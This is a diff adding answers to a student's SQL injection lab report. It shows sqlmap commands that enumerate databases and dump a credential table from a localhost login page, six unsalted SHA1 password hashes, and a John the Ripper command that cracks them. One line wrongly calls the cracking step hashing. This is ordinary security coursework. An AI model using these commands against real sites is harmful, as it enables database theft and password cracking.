@@ -180,8 +180,86 @@ Successfully!
 **Question 1**: Use sqlmap to get information about all available databases
 **Answer 1**:
 
+```
+python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=1&Password=1"  --dbs
+```
+
+![alt text](./image/image-18.png)
+
+![alt text](./image/image-9.png)
+
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
 
+Get table:
+
+```
+python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=1&Password=1"  -D sqllab_users --tables 
+```
+
+![alt text](./image/image-10.png)
+
+![alt text](./image/image-11.png)
+
+We have a table: `credential`
+
+Get user information
+
+```
+python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=1&Password=1"  -D sqllab_users -T credential --dump
+```
+
+![alt text](./image/image-12.png)
+--> QLMap is retrieving information about the columns in the credential table and then fetching all records from this table.
+
+![alt text](./image/image-13.png)
+
+- SQLMap has identified that the Password column in the credential table contains password hashes. This means that passwords are not stored as plain text but as hashes, which is a common security practice.
+- You chose to crack the hashes using a dictionary-based attack. SQLMap starts the cracking process with the hash method sha1_generic_passwd
+
+![alt text](./image/image-14.png)
+
+We got the information users
+
+![alt text](./image/image-15.png)
+
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
-**Answer 3**:
+
+**Install John the Ripper**
+
+![alt text](./image/image-17.png)
+
+
+Pay attention to the address write the hashing password 
+![alt text](./image/image-16.png)
+
+**File txt have content**
+```
+fdbe918bdae83000aa54747fc95fe0470fff4976
+b78ed97677c161c1c82c142906674ad15242b2d4
+a3c50276cb120637cca669eb38fb9928b017e9ef
+995b8b8c183f349b3cab0ae7fccd39133508d2af
+99343bff28a7bb51cb6f22cb20a618701a2c2f58
+a5bdf35a1df4ea895905f6f6618e83951a6effc0
+```
+
+--> This format is SHA1.
+
+
+
+**Use this command to hash the passwords **
+
+```
+john --incremental --fork=4 --format=Raw-SHA1 "C:\Users\dinht\AppData\Local\Temp\sqlmap53i_zw018112\sqlmaphashes-28pxhf9j.txt"
+```
+
+- `--incremental:` This option tells John the Ripper to run in incremental mode. This mode tries all possible combinations of characters to find the correct password. It is comprehensive but can be time-consuming, especially with long or complex passwords.
+- `--fork=4:` This option allows John to run 4 parallel processes (forks). This helps speed up the password-cracking process by distributing the workload across multiple processes.
+- `--format=Raw-SHA1:` This option specifies the format of the hashes you are trying to crack. In this case, the format is Raw-SHA1, meaning the hashes being processed are SHA-1 hashes without any additional information (like salt).
+
+![alt text](image.png)
+
+![alt text](image-1.png)
+
+
+--> Crack Successfully
